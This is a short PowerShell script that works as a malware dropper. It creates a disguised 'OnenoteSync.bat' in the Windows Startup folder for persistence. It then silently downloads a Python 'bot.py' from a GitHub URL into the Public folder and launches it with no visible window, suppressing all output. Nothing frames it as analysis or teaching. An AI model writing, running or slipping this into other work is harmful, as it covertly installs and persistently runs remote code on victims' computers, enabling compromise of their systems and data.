
$startup = [Environment]::GetFolderPath("Startup")
sc -Path "$startup\OnenoteSync.bat" -Value 'start "" pythonw.exe "C:/Users/Public/bot.py"'
cd $env:PUBLIC *> $null
curl 'https://raw.githubusercontent.com/Dangongg/expert-octo-broccoli/refs/heads/main/bot.py' -o 'bot.py' *> $null
Start-Process pythonw.exe -ArgumentList "c:/Users/Public/bot.py" *> $null
exit